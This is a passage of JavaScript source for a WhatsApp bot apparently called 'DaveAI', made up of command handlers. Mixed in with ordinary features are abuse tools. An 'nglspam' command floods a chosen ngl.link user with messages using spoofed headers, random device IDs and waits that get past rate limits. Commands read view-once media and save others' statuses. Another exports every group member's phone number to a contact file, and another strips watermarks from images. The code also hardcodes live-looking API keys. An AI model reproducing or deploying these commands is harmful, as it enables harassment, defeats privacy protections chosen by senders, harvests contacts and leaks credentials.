  m.reply(`✅ Successfully joined group: ${id}`)
}
break

// === Convert Quoted Message to JSON ===
case "tojs":
case "q": {
  if (!isOwner) return reply(mess.owner);
  if (!m.quoted) return;
  let jsonData = JSON.stringify(m.quoted, null, 2);
  m.reply(jsonData);
}
break;

// === Read View-Once Messages ===
case "viewonce":
case "openviewonce": {
  if (!isOwner) return reply(mess.owner);
  if (!m.quoted) return reply("Reply to a view-once message!");
  
  let msg = m?.quoted?.message?.imageMessage ||
            m?.quoted?.message?.videoMessage ||
            m?.quoted?.message?.audioMessage ||
            m?.quoted;
  
  if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce)
    return reply("That message is not a view-once message!");

  const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
  let media = await downloadContentFromMessage(
    msg,
    msg.mimetype == 'image/jpeg'
      ? 'image'
      : msg.mimetype == 'video/mp4'
      ? 'video'
      : 'audio'
  );
  
  let type = msg.mimetype;
  let buffer = Buffer.from([]);
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk]);
  }

  if (/video/.test(type)) {
    return dave.sendMessage(m.chat, { video: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/image/.test(type)) {
    return dave.sendMessage(m.chat, { image: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/audio/.test(type)) {
    return dave.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
  }
}
break;

// === Send Custom Interactive Message ===
case 'sendchat': {
  if (!isOwner) return reply(mess.owner);
  if (!text) return m.reply(`Example: ${cmd} Hello | 2547XXXXXXXX | https://example.com`);
  
  let [l, r, p] = text.split`|`;
  if (!l) l = '';
  if (!r) r = '';
  if (!p) p = '';
  let teks = `${l}`;

  // Bot Owner ID(s)
  const ownerJid = [`${r}`]; // Replace with your WhatsApp number(s)

  for (let id of ownerJid) {
    await dave.sendMessage(id, {
      interactiveMessage: {
        title: teks,
        footer: "𝘿𝙖𝙫𝙚𝘼𝙄",
        thumbnail: thumbnail,
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({
            limited_time_offer: {
              text: "𝘿𝙖𝙫𝙚𝘼𝙄",
              url: "t.me/Digladoo",
              copy_code: `Uptime : ${runtime(process.uptime())}`,
              expiration_time: Date.now() * 999
            },
            bottom_sheet: {
              in_thread_buttons_limit: 2,
              divider_indices: [1, 2, 3, 4, 5, 999],
              list_title: "𝘿𝙖𝙫𝙚𝘼𝙄",
              button_title: "𝘿𝙖𝙫𝙚𝘼𝙄"
            },
            tap_target_configuration: {
              title: "▸ X ◂",
              description: "bomboclard",
              canonical_url: "https://t.me/Digladoo",
              domain: "shop.example.com",
              button_index: 0
            }
          }),
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "View Link",
                url: p,
                merchant_url: p
              })
            }
          ]
        }
      }
    }, { quoted: m });
  }

  m.reply('✅ Successfully sent the message');
}
break;


 case 'save': {
  try {
    const quotedMessage = m.msg?.contextInfo?.quotedMessage;
    
    // Check if user quoted a message
    if (!quotedMessage) {
      return m.reply('Please reply to a status message');
    }
    
    // Verify it's a status message
    if (!m.quoted?.chat?.endsWith('@broadcast')) {
      return m.reply('That message is not a status! Please reply to a status message.');
    }
    
    // Download the media first
    const mediaBuffer = await dave.downloadMediaMessage(m.quoted);
    if (!mediaBuffer || mediaBuffer.length === 0) {
      return m.reply('Could not download the status media. It may have expired.');
    }
    
    // Determine media type and prepare payload
    let payload;
    let mediaType;
    
    if (quotedMessage.imageMessage) {
      mediaType = 'image';
      payload = {
        image: mediaBuffer,
        caption: quotedMessage.imageMessage.caption || '📸 Saved status image',
        mimetype: 'image/jpeg'
      };
    } 
    else if (quotedMessage.videoMessage) {
      mediaType = 'video';
      payload = {
        video: mediaBuffer,
        caption: quotedMessage.videoMessage.caption || '🎥 Saved status video',
        mimetype: 'video/mp4'
      };
    } 
    else {
      return m.reply('Only image and video statuses can be saved!');
    }
    
    // Send to user's DM
    await dave.sendMessage(
      m.sender, 
      payload,
      { quoted: m }
    );
    
    // Confirm in chat
    return m.reply(`✅  ${mediaType} Saved by 𝘿𝙖𝙫𝙚𝘼𝙄!`);
    
  } catch (error) {
    console.error('Save error:', error);
    if (error.message.includes('404') || error.message.includes('not found')) {
      return m.reply('The status may have expired or been deleted.');
    }
    return m.reply('❌ Failed to save status. Error: ' + error.message);
  }
}
break;
//==================================================//   



  case "nglspam": {
  if (!isOwner) return reply(mess.owner);

  if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
    return reply("Enter username, message, and spam amount!\nExample: .nglspam sjasj|hello|5");
  }

  async function sendSpamMessage(username, message, spamCount) {
    let counter = 0;
    while (counter < spamCount) {
      try {
        const date = new Date();
        const formattedTime = `${date.getHours()}:${date.getMinutes()}`;
        const deviceId = crypto.randomBytes(21).toString("hex");
        const url = "https://ngl.link/api/submit";
        const headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "X-Requested-With": "XMLHttpRequest",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          Referer: `https://ngl.link/${username}`,
          Origin: "https://ngl.link"
        };

        const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

        const response = await fetch(url, {
          method: "POST",
          headers,
          body,
          mode: "cors",
          credentials: "include"
        });

        if (response.status !== 200) {
          console.log(`[${formattedTime}] [Error] Rate-limited`);
          await new Promise(res => setTimeout(res, 25000));
        } else {
          counter++;
          console.log(`[${formattedTime}] [Sent] Message #${counter}`);
        }
      } catch (error) {
        console.error(`[Error] ${error}`);
        await new Promise(res => setTimeout(res, 5000));
      }
    }
  }

  const [username, message, count] = text.split("|");
  const spamCount = parseInt(count, 10);
  if (isNaN(spamCount) || spamCount <= 0) {
    return reply("Spam count must be a positive number!");
  }

  try {
    await sendSpamMessage(username, message, spamCount);
    reply(`Successfully sent ${spamCount} NGL messages to ${username}`);
  } catch (e) {
    console.error(e);
    reply("An error occurred, please try again later.");
  }
}
break;

// ================== Upload to Status ==================
case 'uploadstatus':
case 'tostatus':
case 'gcsw':
case 'upwsgc':
case 'upswtag': {
  if (!isOwner) return reply(mess.owner);

  let argsText = text.split(',').map(a => a.trim());
  if (argsText.length < 2) return m.reply(`Example: ${command} groupID, caption`);

  let target = argsText[0];
  let caption = argsText.slice(1).join(',');

  if (!quoted) return m.reply(`Quote a message (image, video, or audio) with caption ${command}`);

  if (quoted.mtype === "audioMessage") {
    let audioData = await quoted.download();
    dave.sendStatusMention({ audio: audioData, mimetype: 'audio/mp4', ptt: true }, [target]);
  }

  if (quoted.mtype === "imageMessage") {
    let imageData = await quoted.download();
    dave.sendStatusMention({ image: imageData, caption: caption || '' }, [target]);
  }

  if (quoted.mtype === "videoMessage") {
    let videoData = await quoted.download();
    dave.sendStatusMention({ video: videoData, caption: caption || '' }, [target]);
  }

  m.reply('Successfully uploaded status with mention!');
}
break;

// ================== OFF SETTINGS ==================
case "off": {
  if (!isOwner) return reply(mess.owner);
  await dave.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'This is an interactiveMeta message' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '',
            sections: [
              {
                title: `© ${namaBot}`,
                rows: [
                  { title: 'Disable AutoTyping', description: 'false', id: `.autotyping off` },
                  { title: 'Disable AutoRead', description: 'false', id: `.autoread off` },
                  { title: 'Disable AutoBio', description: 'false', id: `.autobio off` },
                  { title: 'Disable Prayer Reminder', description: 'false', id: `.autosholat off` },
                  { title: 'Disable Group Only Mode', description: 'false', id: `.onlygc off` }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    text: "Bot Settings"
  }, { quoted: m });
}
break;

// ================== ON SETTINGS ==================
case "on": {
  if (!isOwner) return reply(mess.owner);
  await dave.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'This is an interactiveMeta message' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '',
            sections: [
              {
                title: `© ${namaBot}`,
                rows: [
                  { title: 'Enable AutoTyping', description: 'true', id: `.autotyping on` },
                  { title: 'Enable AutoRead', description: 'true', id: `.autoread on` },
                  { title: 'Enable AutoBio', description: 'true', id: `.autobio on` },
                  { title: 'Enable Prayer Reminder', description: 'true', id: `.autosholat on` },
                  { title: 'Enable Group Only Mode', description: 'true', id: `.onlygc on` }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    text: "Bot Settings"
  }, { quoted: m });
}
break;

// ================== LIST CASE ==================
case "listcase": {
  if (!isOwner) return reply(mess.owner);
  const code = fs.readFileSync('dave.js', 'utf8');
  const regex = /case\s+["'`](.+?)["'`]\s*:/g;
  let match;
  const cases = [];
  while ((match = regex.exec(code)) !== null) cases.push(match[1]);
  return reply(`
*Total Cases:* ${cases.length}

> ${cases.join("\n> ")}
`);
}
break;


case 'anticall': {
    const ANTICALL_PATH = './library/database/anticall.json';

    function readState() {
        try {
            if (!fs.existsSync(ANTICALL_PATH)) return { enabled: false };
            const raw = fs.readFileSync(ANTICALL_PATH, 'utf8');
            const data = JSON.parse(raw || '{}');
            return { enabled: !!data.enabled };
        } catch (err) {
            console.error('Error reading anticall state:', err);
            return { enabled: false };
        }
    }

    function writeState(enabled) {
        try {
            const dir = './library/database';
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify({ enabled: !!enabled }, null, 2));
        } catch (err) {
            console.error('Error writing anticall state:', err);
        }
    }

    const state = readState();
    const sub = args[0]?.toLowerCase();

    if (!sub || (sub !== 'on' && sub !== 'off' && sub !== 'status')) {
        await dave.sendMessage(m.chat, { 
            text: `*🏂 ANTICALL SETTINGS 🏂*\n\n🔹 ${prefix}anticall on - Enable auto-block incoming calls\n🔹 ${prefix}anticall off - Disable anticall\n🔹 ${prefix}anticall status - Show current status` 
        }, { quoted: m });
        break;
    }

    if (sub === 'status') {
        await dave.sendMessage(m.chat, { 
            text: `📞 Anticall is currently *${state.enabled ? 'ENABLED' : 'DISABLED'}*.` 
        }, { quoted: m });
        break;
    }

    const enable = sub === 'on';
    writeState(enable);
    await dave.sendMessage(m.chat, { 
        text: `📞 Anticall is now *${enable ? 'ENABLED' : 'DISABLED'}*.` 
    }, { quoted: m });
}
break;

// ================== REACT CHANNEL ==================
case "reactch":
case "rch": {
  if (!isOwner) return m.reply(mess.owner);
  if (!text) return m.reply("Example:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️dave\n.reactch https://whatsapp.com/channel/xxx/123 ❤️dave|5");

  const fancyText = {
    a:'🅐',b:'🅑',c:'🅒',d:'🅓',e:'🅔',f:'🅕',g:'🅖',h:'🅗',i:'🅘',j:'🅙',k:'🅚',l:'🅛',m:'🅜',n:'🅝',o:'🅞',p:'🅟',q:'🅠',r:'🅡',s:'🅢',t:'🅣',u:'🅤',v:'🅥',w:'🅦',x:'🅧',y:'🅨',z:'🅩',
    '0':'⓿','1':'➊','2':'➋','3':'➌','4':'➍','5':'➎','6':'➏','7':'➐','8':'➑','9':'➒'
  };

  const [mainText, offsetStr] = text.split('|');
  const args = mainText.trim().split(" ");
  const link = args[0];

  if (!link.includes("https://whatsapp.com/channel/")) {
    return m.reply("Invalid link!\nExample: .reactch https://whatsapp.com/channel/xxx/id ❤️dave|3");
  }

  const channelId = link.split('/')[4];
  const rawMessageId = parseInt(link.split('/')[5]);
  if (!channelId || isNaN(rawMessageId)) return m.reply("Incomplete link!");

  const offset = parseInt(offsetStr?.trim()) || 1;
  const plainText = args.slice(1).join(' ');
  const emojiText = plainText.replace(link, '').trim();
  if (!emojiText) return m.reply("Enter text/emoji to react with.");

  const emoji = emojiText.toLowerCase().split('').map(c => fancyText[c] || c).join('');

  try {
    const metadata = await dave.newsletterMetadata("invite", channelId);
    let success = 0, failed = 0;
    for (let i = 0; i < offset; i++) {
      const msgId = (rawMessageId - i).toString();
      try {
        await dave.newsletterReactMessage(metadata.id, msgId, emoji);
        success++;
      } catch {
        failed++;
      }
    }
    m.reply(`✅ Successfully reacted *${emoji}* to ${success} messages in *${metadata.name}*\n❌ Failed on ${failed} messages`);
  } catch (err) {
    console.error(err);
    m.reply("❌ Failed to process your request!");
  }
}
break;

// ================== CLEAR CHAT ==================
case "clearchat":
case "clear": {
  if (!isOwner) return reply(mess.owner);
  dave.chatModify({
    delete: true,
    lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
  }, m.chat);
}
break;

// ================== READ VIEW ONCE ==================
case "rvo":
case "readviewonce": {
  if (!isOwner) return reply(mess.owner);
  if (!m.quoted) return reply("Reply to a view-once message!");

  let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted;
  if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("That’s not a view-once message!");

  const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
  let media = await downloadContentFromMessage(msg, /image/.test(msg.mimetype) ? 'image' : /video/.test(msg.mimetype) ? 'video' : 'audio');
  let buffer = Buffer.from([]);
  for await (const chunk of media) buffer = Buffer.concat([buffer, chunk]);

  if (/video/.test(msg.mimetype)) {
    return dave.sendMessage(m.chat, { video: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/image/.test(msg.mimetype)) {
    return dave.sendMessage(m.chat, { image: buffer, caption: msg.caption || "" }, { quoted: m });
  } else if (/audio/.test(msg.mimetype)) {
    return dave.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
  }
}
break;

// ================== LIST GROUPS ==================
case 'listgc': {
  if (!isOwner) return reply(mess.owner);

  try {
    const getGroups = await dave.groupFetchAllParticipating();
    const groups = Object.values(getGroups);
    if (!groups.length) return reply('❌ The bot is not in any groups.');

    let text = `⬣ *GROUP LIST ${namaBot.toUpperCase()}*\n📊 Total Groups: ${groups.length}\n\n`;

    const buttons = [];
    groups.forEach((g, i) => {
      const groupId = g.id;
      const groupName = g.subject;
      const memberCount = g.participants?.length || 0;
      const created = moment(g.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm') + ' WIB';

      text += `*${i + 1}. ${groupName}*\n🆔 ID: ${groupId}\n👥 Members: ${memberCount}\n🕐 Created: ${created}\n\n`;

      buttons.push({
        name: 'cta_copy',
        buttonParamsJson: JSON.stringify({
          display_text: `📋 Copy GC ID #${i + 1}`,
          copy_code: groupId,
          id: `gc-${i + 1}`
        })
      });
    });

    await dave.sendMessage(m.chat, {
      text,
      footer: `📌 Click the button to copy group ID`,
      title: `📃 Active Group List`,
      interactiveButtons: buttons
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    reply('❌ Failed to fetch group data.');
  }
}
break;

// ================== LIST OWNERS ==================
case "listowner":
case "listown": {
  if (owner.length < 1) return m.reply("No additional owners found.");
  let text = `\n *#- List of all additional owners*\n`;
  for (let i of owner) {
    text += `\n* ${i.split("@")[0]}\n* *Tag:* @${i.split("@")[0]}\n`;
  }
  dave.sendMessage(m.chat, { text, mentions: owner }, { quoted: m });
}
break;

        case "disp-90": { 
                 if (!m.isGroup) return reply (mess.group); 
                 
                 if (!isAdmins) return reply (mess.admin); 
  
                     await dave.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break; 
//==================================================//         
        case "disp-off": { 
                 if (!m.isGroup) return reply (mess.group); 
             
                 if (!isAdmins) return reply (mess.admin); 
  
                     await dave.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;
       
//==================================================//  
        case "disp-1": { 
                 if (!m.isGroup) return reply (mess.group); 
                
                 if (!isAdmins) return reply (mess.admin); 
  
                     await dave.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
 break; 
//==================================================//  
case 'autotyping':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
reply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
reply(`Successfully Changed Auto Typing To ${q}`)
}
break
//==================================================//       
        case 'onlygroup':
case 'onlygc':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on / off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
reply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
reply(`Successfully Changed Onlygroup To ${q}`)
}
break
//==================================================//             
case 'onlypc':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlypc = true
reply(`Successfully Changed Onlypc To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlypc = false
reply(`Successfully Changed Onlypc To ${q}`)
}
break
//==================================================//      
       case 'unavailable':
                if (!daveshown) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    reply(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    reply(`Successfully changed unavailable to ${q}`)
                }
            break
        
        
//==================================================//           
        case 'antilink': {
               if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !daveshown) return reply(mess.admins)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  reply(`${command} is disabled`)
               }
            }
            break
//==================================================//    

        case 'autoreactstatus':
case 'autoreact': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply('on/off?')
    if (args[0] === 'on') {
        global.autoreactstatus = true
        reply(`${command} is enabled`)
    } else if (args[0] === 'off') {
        global.autoreactstatus = false
        reply(`${command} is disabled`)
    }
}
break

        case 'antilinkgc': {
               if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
               if (args.length < 1) return m.reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  m.reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  m.reply(`${command} is disabled`)
               }
            }
            break
            
            
            case 'statuscheck':
case 'checkstatus': {
    if (!daveshown) return reply(mess.owner)
    
    const viewStatus = global.autoviewstatus ? '✅ Enabled' : '❌ Disabled'
    const reactStatus = global.autoreactstatus ? '✅ Enabled' : '❌ Disabled'
    
    reply(`📊 Auto Status Settings:\n\n👀 Auto View: ${viewStatus}\n💫 Auto React: ${reactStatus}`)
}
break
        
                
                
                
//==================================================//      
        case 'autoviewstatus':
case 'autostatusview': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply('on/off?')
    if (args[0] === 'on') {
        global.autoviewstatus = true
        reply(`${command} is enabled`)
    } else if (args[0] === 'off') {
        global.autoviewstatus = false
        reply(`${command} is disabled`)
    }
}
break
//==================================================//        
        case 'unwarning':
    case 'unwarn': {
      if (!m.isGroup) return reply(mess.owner)
      if (!isAdmins) return reply(mess.admin)
      

      let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      if (!users) return reply(`Tag/Reply target${command}`)
      if (daveshown) return reply('feature reserved for owner or sudo numbers only')

      if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}

      if (!db.data.chats[m.chat].warn[users] || db.data.chats[m.chat].warn[users] === 0) {
        return reply(`User is already in the warning list.`)
      }

      db.data.chats[m.chat].warn[users] -= 1

      const sisa = db.data.chats[m.chat].warn[users]

      dave.sendTextWithMentions(m.chat, `✅ Success *${command}* @${users.split('@')[0]}\nRemoved Warning: ${sisa}/${setting.warnCount}`, m)
      if (db.data.chats[m.chat].warn[users] === 0) {
        delete db.data.chats[m.chat].warn[m.sender];
      }
    }
    break
        case 'ch': {
  try {
    const carouselCards = [
      {
        image: trashpic,                          
        
        title: "Card 1",
        description: "This is card 1",
        id: "card_1"
      },
      {
        image: trashpic,
        title: "Card 2",
        description: "This is card 2",
        id: "card_2"
      },
      {
        image: trashpic,                        
        
        title: "Card 3",
        description: "This is card 3",
        id: "card_3"
      }
    ];

    const cards = carouselCards.map(card => ({
      image: {
        link: card.image
      },
      title: card.title,
      subtitle: card.description
    }));

    await dave.relayMessage(from, {
      template: {
        type: "media",
        media: {
          type: "image",
          image: {
            link: cards[0].image.link
          }
        },
        carousel: cards
      }
    }, { quoted: m });

  } catch (error) {
    console.error("Error sending carousel:", error);
  }
}
break;
//==================================================//   
        
case 'take': {
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

if(!msgR) return reply('Quote an image, a short video or a sticker to change watermark.'); 

let media;
if (m.imageMessage) {
     media = msgR.imageMessage
  } else if(msgR.videoMessage) {
media = args.join(" ").videoMessage
  } 
  else if (msgR.stickerMessage) {
    media = msgR.stickerMessage ;
  } else {
    reply('This is neither a sticker, image nor a video...'); return
  } ;

var result = await dave.downloadAndSaveMediaMessage(media);

let stickerResult = new Sticker(result, {
            pack: pushname,
            author: pushname,
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"],
            id: "12345",
            quality: 70,
            background: "transparent",
          });
const Buffer = await stickerResult.toBuffer();
          dave.sendMessage(m.chat, { sticker: Buffer }, { quoted: m });

}
break;
//==================================================//   


case "vcf": 
case "group-vcf": {
    if (!m.isGroup) return m.reply("❌ This command can only be used in groups.");

    const fs = require("fs");
    let gcdata = await dave.groupMetadata(m.chat)
    let gcmem = participants.map(a => a.id)

    let vcard = ''
    let noPort = 0

    for (let a of gcdata.participants) {
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
    }

    let cont = './contacts.vcf'

    await m.reply('⏳ 𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗙𝗿𝗼𝘀𝘁 𝗶𝘀 𝗖𝗼𝗺𝗽𝗶𝗹𝗶𝗻𝗴 '+gcdata.participants.length+' 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀 𝗶𝗻𝘁𝗼 𝗮 𝗩𝗰𝗳...');
    await fs.writeFileSync(cont, vcard.trim())
    await dave.sendMessage(m.chat, {
        document: fs.readFileSync(cont), 
        mimetype: 'text/vcard', 
        fileName: 'Group contacts.vcf', 
        caption: 'VCF for '+gcdata.subject+'\n👥 '+gcdata.participants.length+' contacts\n\n📱 Generated by 𝘿𝙖𝙫𝙚𝘼𝙄'
    }, {quoted: m})
    fs.unlinkSync(cont)
}
break;

case "apk":
case "app": {
    if (!text) return reply("Where is the app name?");
    
    try {
        let kyuu = await fetchJson(`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson(`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
        
        await dave.sendMessage(
            m.chat,
            {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
                    externalAdReply: {
                        title: `𝘿𝙖𝙫𝙚𝘼𝙄`,
                        body: `${tylor.BK9.name}`,
                        thumbnailUrl: `${tylor.BK9.icon}`,
                        sourceUrl: `${tylor.BK9.dllink}`,
                        mediaType: 2,
                        showAdAttribution: true,
                        renderLargerThumbnail: false
                    }
                }
            }, { quoted: m }
        );
    } catch (error) {
        console.error('Error in apk command:', error);
        reply('Failed to fetch APK. Please try again with a different app name.');
    }
}
break;


case 'getpp':
case 'pp':
case 'profilepic': {
    try {
        let targetUser = m.sender;
        
        // Check if user mentioned someone or replied to a message
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetUser = m.mentionedJid[0];
        } else if (m.quoted) {
            targetUser = m.quoted.sender;
        }
        
        const ppUrl = await dave.profilePictureUrl(targetUser, 'image').catch(() => null);
        
        if (ppUrl) {
            await dave.sendMessage(m.chat, {
                image: { url: ppUrl },
                caption: `Profile picture of @${targetUser.split('@')[0]}`,
                mentions: [targetUser],
                buttons: [
                    { buttonId: 'menu', buttonText: { displayText: '📋 Menu' }, type: 1 },
                    { buttonId: 'alive', buttonText: { displayText: '🤖 Status' }, type: 1 }
                ],
                footer: "𝘿𝙖𝙫𝙚𝘼𝙄"
            }, { quoted: m });
        } else {
            await dave.sendMessage(m.chat, {
                text: `@${targetUser.split('@')[0]} doesn't have a profile picture.`,
                mentions: [targetUser],
                buttons: [
                    { buttonId: 'menu', buttonText: { displayText: '📋 Menu' }, type: 1 },
                    { buttonId: 'alive', buttonText: { displayText: '🤖 Status' }, type: 1 }
                ],
                footer: "𝘿𝙖𝙫𝙚𝘼𝙄"
            }, { quoted: m });
        }
    } catch (error) {
        console.error("Error in profilepic command:", error);
        await dave.sendMessage(m.chat, {
            text: "Error fetching profile picture.",
            buttons: [
                { buttonId: 'menu', buttonText: { displayText: '📋 Menu' }, type: 1 }
            ]
        }, { quoted: m });
    }
}
break;




// === TO ANIME / TO REALISTIC ===
case 'toanime':
case 'toreal': {
  try {
    if (!/image/.test(mime)) {
      return m.reply(`Send or reply to an image with caption ${command}`);
    }

    await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } });

    const style = command === 'toanime' ? 'AnimageModel' : 'RealisticModel';
    const media = await dave.downloadAndSaveMediaMessage(quoted);
    const imageUrl = await CatBox(media);

    const apiUrl = `https://fastrestapis.fasturl.cloud/imgedit/aiimage?prompt=Anime&reffImage=${encodeURIComponent(imageUrl)}&style=${style}&width=1024&height=1024&creativity=0.5`;

    await dave.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
  } catch (err) {
    console.error('An error occurred:', err);
    m.reply('An error occurred');
  } finally {
    if (media) {
      fs.promises.unlink(media).catch(() => {});
    }
  }
}
break;

// === OCR (IMAGE TO TEXT) ===
case 'ocr': {
  try {
    await dave.sendMessage(m.chat, {
      react: { text: '🕒', key: m.key }
    });

    const axios = require('axios');
    const FormData = require('form-data');

    const Uguu = async (buffer, filename) => {
      const form = new FormData();
      form.append('files[]', buffer, { filename });
      const { data } = await axios.post('https://uguu.se/upload.php', form, {
        headers: form.getHeaders()
      });
      if (data.files && data.files[0]) {
        return data.files[0].url;
      } else {
        throw new Error('Upload to uguu.se failed, please try again later');
      }
    };

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime.startsWith('image/')) throw 'Please send or reply to an image';
    let media = await q.download();
    let ext = mime.split('/')[1] || 'jpg';
    let filename = `ocr.${ext}`;
    let imageUrl = await Uguu(media, filename);
    let { data } = await axios.get(`https://api.alyachan.dev/api/ocr?image=${imageUrl}&apikey=DinzIDgembul`);

    if (!data?.status || !data.result?.text) throw 'OCR failed, or no text found';
    let result = data.result.text.replace(/\r/g, '').trim();

    await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    m.reply(result);
  } catch (err) {
    m.reply(typeof err === 'string' ? err : err.message || 'An error occurred while processing the image');
  }
}
break;

// === REMOVE WATERMARK ===
case 'remove-wm': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || '';

  let defaultPrompt = `Remove any watermark found in the image. Carefully check since the watermark might appear on the top, bottom, middle, or be hidden in small, transparent, or blurred form. Remove the watermark completely without reducing image quality or altering other visual elements. Ensure the image remains clean, natural, and looks as if it never had a watermark.`;

  if (!mime) return m.reply(`Send or reply to an image with caption *${usedPrefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  let promptText = text || defaultPrompt;

  reply("Deleting watermark...");

  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    for (const part of response.response.candidates[0].content.parts) {
      if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);

      await dave.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Watermark removed successfully*`
      }, { quoted: m });

      setTimeout(() => {
        try { fs.unlinkSync(tempPath); } catch {}
      }, 30000);
    } else {
      m.reply("Error occurred while editing image");
    }
  } catch (error) {
    console.error(error);
    m.reply(`${error.message}`);
  }
}
break;

// === AI CHAT (GPT / GEMINI / LUMINAI) ===
case 'gemini':
case 'luminai':
case 'gpt':
case 'openai':
case 'ai': {
  try {
